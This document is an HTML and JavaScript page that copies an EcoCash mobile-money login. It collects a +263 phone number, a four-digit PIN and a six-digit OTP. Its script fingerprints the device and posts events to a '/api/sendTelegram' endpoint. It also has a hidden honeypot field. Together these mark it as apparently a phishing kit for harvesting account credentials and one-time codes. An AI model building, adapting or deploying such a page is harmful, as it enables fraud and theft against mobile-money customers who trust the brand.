<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>EcoCash — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
}
.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 12px 30px rgba(2,6,23,.06)
}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;font-size:20px}
label{display:block;font-size:13px;margin-top:8px}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #e6eefc;
  background:#fbfdff;
  font-size:14px
}
.btn{
  background:#4b86ff;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%;
  font-weight:600;
  cursor:pointer;
}
.btn[disabled]{background:#cbd5e1;cursor:not-allowed}

.req{color:#d04444;margin-right:6px}
.small{font-size:13px;color:#6b7280}
.success{color:#16a34a;font-weight:600}

.error{
  min-height:18px;
  font-size:13px;
  color:#d04444;
}

/* PIN */
.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
.pin-digit{
  width:40px;height:48px;
  text-align:center;
  font-size:20px;
  border-radius:8px;
  border:1px solid #e6eefc;
}

/* OTP */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.35);
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:40;
}
.otp-box{
  background:#fff;
  padding:18px;
  border-radius:12px;
  min-width:300px
}
.otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
.otp-digit{
  width:40px;height:48px;
  text-align:center;
  font-size:20px;
  border-radius:8px;
  border:1px solid #e6eefc
}
.otp-warning{color:#d04444;font-size:13px;display:none}

.resend-row{
  display:flex;
  justify-content:space-between;
  margin-top:12px
}
.resend-btn{
  background:#4b86ff;
  color:#fff;
  border:0;
  padding:6px 12px;
  border-radius:8px;
  cursor:pointer;
  font-weight:600;
  display:flex;
  align-items:center;
  gap:6px;
}
.resend-btn[disabled]{
  background:#cbd5e1;
  cursor:not-allowed;
}

/* Spinner */
.spinner{
  width:14px;
  height:14px;
  border:2px solid rgba(255,255,255,.5);
  border-top-color:#fff;
  border-radius:50%;
  animation:spin 1s linear infinite;
  display:none;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* Toast */
.toast{
  position:fixed;
  bottom:20px;
  left:50%;
  transform:translateX(-50%);
  background:#16a34a;
  color:#fff;
  padding:10px 14px;
  border-radius:10px;
  font-size:14px;
  box-shadow:0 8px 20px rgba(0,0,0,.15);
  display:none;
  z-index:50;
}

/* OTP ACTION BUTTONS */
.otp-actions{
  display:flex;
  gap:10px;
  margin-top:12px;
}
.otp-actions button{
  flex:1;
  padding:10px;
  border-radius:8px;
  border:0;
  font-weight:600;
  cursor:pointer;
}
#confirmOtp{
  background:#4b86ff;
  color:#fff;
}
#confirmOtp[disabled]{
  background:#cbd5e1;
  cursor:not-allowed;
}
#cancelOtp{
  background:#e5e7eb;
  color:#111;
}
</style>
</head>

<body>

<div class="card">
  <img src="assets/eco.png" alt="EcoCash" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263" inputmode="numeric">
    <div id="phoneError" class="error"></div>

    <label><span class="req">★</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input type="text" id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
    </div>

    <div class="resend-row">
      <div class="small" id="resendInfo">
        Resend available in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>
        <span class="spinner" id="spinner"></span>
        <span id="resendText">Resend OTP</span>
      </button>
    </div>

    <div class="otp-actions">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<div id="toast" class="toast">OTP resent successfully</div>

<script>
/* ===== DEVICE STRING ===== */
const ua = navigator.userAgent;
let device = 'Unknown';
if (/Android/i.test(ua)) device='Android';
if (/iPhone|iPad/i.test(ua)) device='iOS';

/* ===== GET SELECTED PLAN ===== */
let planData=null;
try{const raw=sessionStorage.getItem('selectedPlan');if(raw)planData=JSON.parse(raw);}catch(e){}

/* ===== OTP ===== */
const resendBtn=document.getElementById('resendBtn');
const resendInfo=document.getElementById('resendInfo');
const spinner=document.getElementById('spinner');
const resendText=document.getElementById('resendText');
const toast=document.getElementById('toast');

let countdownEl=null;
let timer,seconds=120;

function showToast(){
  toast.style.display='block';
  setTimeout(()=>toast.style.display='none',2500);
}

function startCountdown(){
  clearInterval(timer);
  seconds=120;
  resendBtn.disabled=true;

  resendInfo.innerHTML='Resend available in <span id="countdown">120</span>s';
  countdownEl=document.getElementById('countdown');

  timer=setInterval(()=>{
    seconds--;
    if(countdownEl) countdownEl.textContent=seconds;
    if(seconds<=0){
      clearInterval(timer);
      resendBtn.disabled=false;
      resendInfo.textContent="Didn't receive OTP?";
    }
  },1000);
}

resendBtn.onclick=async()=>{
  spinner.style.display='inline-block';
  resendText.textContent='Sending';
  startCountdown();

  await fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      event:'resend_otp',
      selectedPlan:planData,
      device,
      submittedAt:new Date().toISOString()
    })
  });

  spinner.style.display='none';
  resendText.textContent='Resend OTP';
  showToast();
};
</script>

</body>
</html>
